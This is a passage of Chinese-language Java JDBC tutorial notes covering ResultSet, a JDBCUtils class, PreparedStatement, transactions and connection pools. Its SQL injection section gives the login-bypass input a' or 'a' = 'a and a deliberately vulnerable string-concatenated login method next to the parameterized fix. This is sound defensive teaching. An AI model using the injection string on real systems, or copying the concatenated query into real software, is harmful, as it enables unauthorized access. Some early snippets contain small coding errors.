class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">string sql=<span class="string">&quot;select * from table&quot;</span></span><br><span class="line">statement =con.createStatement();</span><br><span class="line">re=statement.executeQuery(sql)<span class="comment">//返回的是结果集</span></span><br><span class="line"><span class="comment">//处理结果</span></span><br><span class="line">rs.next();</span><br><span class="line"><span class="keyword">int</span> id=rs.getInt(<span class="number">1</span>);</span><br><span class="line">String name=rs.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">System.out.println(id)</span><br><span class="line">System.out.println(name)</span><br></pre></td></tr></table></figure><p>使用时的注意：</p><ol><li>游标向下一行</li><li>判断是否有数据</li><li>获取数据</li></ol><p>next（）方法返回布尔值</p><p>正确使用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">while(rs.next())&#123;</span><br><span class="line">int id&#x3D;rs.getInt(1);</span><br><span class="line">String name&#x3D;rs.getString(&quot;name&quot;);</span><br><span class="line">System.out.println(id)</span><br><span class="line">System.out.println(name)</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;打印出所有的行的值</span><br></pre></td></tr></table></figure></blockquote><h5 id="抽取jdbc工具类"><a href="#抽取jdbc工具类" class="headerlink" title="抽取jdbc工具类"></a>抽取jdbc工具类</h5><p>jdbc.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">url</span>=<span class="string">jdbc:mysql:///db1</span></span><br><span class="line"><span class="attr">user</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">password</span>=<span class="string">123456</span></span><br><span class="line"><span class="attr">driver</span>=<span class="string">com.mysql.jdbc.Driver</span></span><br></pre></td></tr></table></figure><p>JDBCUtils类</p><blockquote><p>获取src路径下的文件的方式     ClassLoader()类加载器</p><p>Properties pro=new Properties();</p><p>ClassLoader loader=JDBCUtils.class.getClassLoader();<br>//        3.获取字节流<br>   Url res=loader.getResourceAsStream(“jdbc.properties”);</p><p>String path=res.getPath();</p><p>pro.load(new FileReader(path))</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JDBC工具类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDBCUtils</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String url;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String user;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String password;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String driver;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 文件的读取，只需要读取一次即可拿到这些值。使用静态代码块</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="comment">//读取资源文件，获取值。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//1. 创建Properties集合类。</span></span><br><span class="line">            Properties pro = <span class="keyword">new</span> Properties();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取src路径下的文件的方式---&gt;ClassLoader 类加载器</span></span><br><span class="line">            ClassLoader classLoader = JDBCUtils.class.getClassLoader();</span><br><span class="line">            URL res  = classLoader.getResource(<span class="string">&quot;jdbc.properties&quot;</span>);</span><br><span class="line">            String path = res.getPath();</span><br><span class="line">           <span class="comment">// System.out.println(path);///D:/IdeaProjects/itcast/out/production/day04_jdbc/jdbc.properties</span></span><br><span class="line">            <span class="comment">//2. 加载文件</span></span><br><span class="line">           <span class="comment">// pro.load(new FileReader(&quot;D:\\IdeaProjects\\itcast\\day04_jdbc\\src\\jdbc.properties&quot;));</span></span><br><span class="line">            pro.load(<span class="keyword">new</span> FileReader(path));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//3. 获取数据，赋值</span></span><br><span class="line">            url = pro.getProperty(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">            user = pro.getProperty(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">            password = pro.getProperty(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            driver = pro.getProperty(<span class="string">&quot;driver&quot;</span>);</span><br><span class="line">            <span class="comment">//4. 注册驱动</span></span><br><span class="line">            Class.forName(driver);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取连接</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 连接对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> DriverManager.getConnection(url, user, password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 释放资源</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> stmt</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> conn</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">(Statement stmt,Connection conn)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( stmt != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                stmt.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( conn != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 释放资源</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> stmt</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> conn</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">(ResultSet rs,Statement stmt, Connection conn)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( rs != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                rs.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( stmt != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                stmt.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( conn != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="5-PreparedSteatment"><a href="#5-PreparedSteatment" class="headerlink" title="5.PreparedSteatment"></a>5.PreparedSteatment</h4><blockquote><p>执行sql对象 更加强大</p><p>执行动态sql  </p></blockquote><h5 id="Sql注入问题"><a href="#Sql注入问题" class="headerlink" title="Sql注入问题"></a>Sql注入问题</h5><blockquote><p>在拼接sql时，有一些sql的特殊关键字参与字符串的拼接。会造成安全性问题</p><ol><li>输入用户随便，输入密码：a’ or ‘a’ = ‘a<pre><code>     2. sql：select * from user where username = &#39;fhdsjkf&#39; and password = &#39;a&#39; or &#39;a&#39; = &#39;a&#39; </code></pre></li></ol><p>解决sql注入问题：使用PreparedStatement对象来解决</p><p>预编译的SQL：参数使用?作为占位符  给问号赋值就行</p><ol start="4"><li><p>步骤：</p><pre><code>     1. 导入驱动jar包 mysql-connector-java-5.1.37-bin.jar     2. 注册驱动     3. 获取数据库连接对象 Connection     4. 定义sql         * 注意：sql的参数使用？作为占位符。 如：select * from user where username = ? and password = ?;     5. 获取执行sql语句的对象 PreparedStatement  Connection.prepareStatement(String sql)      6. 给？赋值：         * 方法： setXxx(参数1,参数2)             * 参数1：？的位置编号 从1 开始             * 参数2：？的值     7. 执行sql，接受返回结果，不需要传递sql语句     8. 处理结果     9. 释放资源</code></pre><ol start="5"><li>注意：后期都会使用PreparedStatement来完成增删改查的所有操作<ol><li>可以防止SQL注入</li><li>效率更高</li></ol></li></ol></li></ol></blockquote><p>使用案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.jdbc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.itcast.util.JDBCUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 练习：</span></span><br><span class="line"><span class="comment"> * * 需求：</span></span><br><span class="line"><span class="comment"> * 1. 通过键盘录入用户名和密码</span></span><br><span class="line"><span class="comment"> * 2. 判断用户是否登录成功</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDBCDemo9</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.键盘录入，接受用户名和密码</span></span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入用户名：&quot;</span>);</span><br><span class="line">        String username = sc.nextLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入密码：&quot;</span>);</span><br><span class="line">        String password = sc.nextLine();</span><br><span class="line">        <span class="comment">//2.调用方法</span></span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">new</span> JDBCDemo9().login2(username, password);</span><br><span class="line">        <span class="comment">//3.判断结果，输出不同语句</span></span><br><span class="line">        <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">            <span class="comment">//登录成功</span></span><br><span class="line">            System.out.println(<span class="string">&quot;登录成功！&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;用户名或密码错误！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 登录方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">login</span><span class="params">(String username ,String password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="keyword">null</span> || password == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//连接数据库判断是否登录成功</span></span><br><span class="line">        Connection conn = <span class="keyword">null</span>;</span><br><span class="line">        Statement stmt =  <span class="keyword">null</span>;</span><br><span class="line">        ResultSet rs = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">//1.获取连接</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn =  JDBCUtils.getConnection();</span><br><span class="line">            <span class="comment">//2.定义sql</span></span><br><span class="line">            String sql = <span class="string">&quot;select * from user where username = &#x27;&quot;</span>+username+<span class="string">&quot;&#x27; and password = &#x27;&quot;</span>+password+<span class="string">&quot;&#x27; &quot;</span>;</span><br><span class="line">            System.out.println(sql);</span><br><span class="line">            <span class="comment">//3.获取执行sql的对象</span></span><br><span class="line">            stmt = conn.createStatement();</span><br><span class="line">            <span class="comment">//4.执行查询</span></span><br><span class="line">            rs = stmt.executeQuery(sql);</span><br><span class="line">            <span class="comment">//5.判断</span></span><br><span class="line">           <span class="comment">/* if(rs.next())&#123;//如果有下一行，则返回true</span></span><br><span class="line"><span class="comment">                return true;</span></span><br><span class="line"><span class="comment">            &#125;else&#123;</span></span><br><span class="line"><span class="comment">                return false;</span></span><br><span class="line"><span class="comment">            &#125;*/</span></span><br><span class="line">           <span class="keyword">return</span> rs.next();<span class="comment">//如果有下一行，则返回true</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            JDBCUtils.close(rs,stmt,conn);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 登录方法,使用PreparedStatement实现</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">login2</span><span class="params">(String username ,String password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="keyword">null</span> || password == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//连接数据库判断是否登录成功</span></span><br><span class="line">        Connection conn = <span class="keyword">null</span>;</span><br><span class="line">        PreparedStatement pstmt =  <span class="keyword">null</span>;</span><br><span class="line">        ResultSet rs = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">//1.获取连接</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn =  JDBCUtils.getConnection();</span><br><span class="line">            <span class="comment">//2.定义sql</span></span><br><span class="line">            String sql = <span class="string">&quot;select * from user where username = ? and password = ?&quot;</span>;</span><br><span class="line">            <span class="comment">//3.获取执行sql的对象</span></span><br><span class="line">            pstmt = conn.prepareStatement(sql);</span><br><span class="line">            <span class="comment">//给?赋值</span></span><br><span class="line">            pstmt.setString(<span class="number">1</span>,username);</span><br><span class="line">            pstmt.setString(<span class="number">2</span>,password);</span><br><span class="line">            <span class="comment">//4.执行查询,不需要传递sql</span></span><br><span class="line">            rs = pstmt.executeQuery();</span><br><span class="line">            <span class="comment">//5.判断</span></span><br><span class="line">           <span class="comment">/* if(rs.next())&#123;//如果有下一行，则返回true</span></span><br><span class="line"><span class="comment">                return true;</span></span><br><span class="line"><span class="comment">            &#125;else&#123;</span></span><br><span class="line"><span class="comment">                return false;</span></span><br><span class="line"><span class="comment">            &#125;*/</span></span><br><span class="line">            <span class="keyword">return</span> rs.next();<span class="comment">//如果有下一行，则返回true</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            JDBCUtils.close(rs,pstmt,conn);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="jdbc控制事务"><a href="#jdbc控制事务" class="headerlink" title="jdbc控制事务"></a>jdbc控制事务</h3><blockquote><ol><li><p>事务：一个包含多个步骤的业务操作。如果这个业务操作被事务管理，则这多个步骤要么同时成功，要么同时失败。</p></li><li><p>操作：</p><ol><li>开启事务</li><li>提交事务</li><li>回滚事务</li></ol></li><li><p>使用Connection对象来管理事务</p><ul><li>开启事务：setAutoCommit(boolean autoCommit) ：调用该方法设置参数为false，即开启事务<ul><li>在执行sql之前开启事务</li></ul></li><li>提交事务：commit() <ul><li>当所有sql都执行完提交事务</li></ul></li><li>回滚事务：rollback() <ul><li>在catch中回滚事务</li></ul></li></ul></li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.jdbc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.itcast.util.JDBCUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 事务操作</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDBCDemo10</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Connection conn = <span class="keyword">null</span>;</span><br><span class="line">        PreparedStatement pstmt1 = <span class="keyword">null</span>;</span><br><span class="line">        PreparedStatement pstmt2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//1.获取连接</span></span><br><span class="line">            conn = JDBCUtils.getConnection();</span><br><span class="line">            <span class="comment">//开启事务</span></span><br><span class="line">            conn.setAutoCommit(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//2.定义sql</span></span><br><span class="line">            <span class="comment">//2.1 张三 - 500</span></span><br><span class="line">            String sql1 = <span class="string">&quot;update account set balance = balance - ? where id = ?&quot;</span>;</span><br><span class="line">            <span class="comment">//2.2 李四 + 500</span></span><br><span class="line">            String sql2 = <span class="string">&quot;update account set balance = balance + ? where id = ?&quot;</span>;</span><br><span class="line">            <span class="comment">//3.获取执行sql对象</span></span><br><span class="line">            pstmt1 = conn.prepareStatement(sql1);</span><br><span class="line">            pstmt2 = conn.prepareStatement(sql2);</span><br><span class="line">            <span class="comment">//4. 设置参数</span></span><br><span class="line">            pstmt1.setDouble(<span class="number">1</span>,<span class="number">500</span>);</span><br><span class="line">            pstmt1.setInt(<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            pstmt2.setDouble(<span class="number">1</span>,<span class="number">500</span>);</span><br><span class="line">            pstmt2.setInt(<span class="number">2</span>,<span class="number">2</span>);</span><br><span class="line">            <span class="comment">//5.执行sql</span></span><br><span class="line">            pstmt1.executeUpdate();</span><br><span class="line">            <span class="comment">// 手动制造异常</span></span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">3</span>/<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            pstmt2.executeUpdate();</span><br><span class="line">            <span class="comment">//提交事务</span></span><br><span class="line">            conn.commit();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">//事务回滚</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    conn.rollback();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e1) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            JDBCUtils.close(pstmt1,conn);</span><br><span class="line">            JDBCUtils.close(pstmt2,<span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="数据库连接池"><a href="#数据库连接池" class="headerlink" title="数据库连接池"></a>数据库连接池</h3><blockquote><p>解决资源浪费</p><p>池子   容器   存放数据库连接的容器</p><ol><li><p>概念：其实就是一个容器(集合)，存放数据库连接的容器。</p><pre><code> 当系统初始化好后，容器被创建，容器中会申请一些连接对象，当用户来访问数据库时，从容器中获取连接对象，用户访问完之后，会将连接对象归还给容器。</code></pre></li><li><p>好处：</p><ol><li>节约资源</li><li>用户访问高效</li></ol></li><li><p>实现：</p><ol><li><p>标准接口：DataSource   javax.sql包下的</p><ol><li>方法：<ul><li>获取连接：getConnection()</li><li>归还连接：Connection.close()。如果连接对象Connection是从连接池中获取的，那么调用Connection.close()方法，则不会再关闭连接了。而是归还连接</li></ul></li></ol></li><li><p>一般我们不去实现它，有数据库厂商来实现</p><ol><li>C3P0：数据库连接池技术</li><li>Druid：数据库连接池实现技术，由阿里巴巴提供的</li></ol></li></ol></li></ol></blockquote><h4 id="C3p0"><a href="#C3p0" class="headerlink" title="C3p0"></a>C3p0</h4><blockquote><p>C3P0：数据库连接池技术</p><ul><li>步骤：<ol><li>导入jar包 (两个) c3p0-0.9.5.2.jar 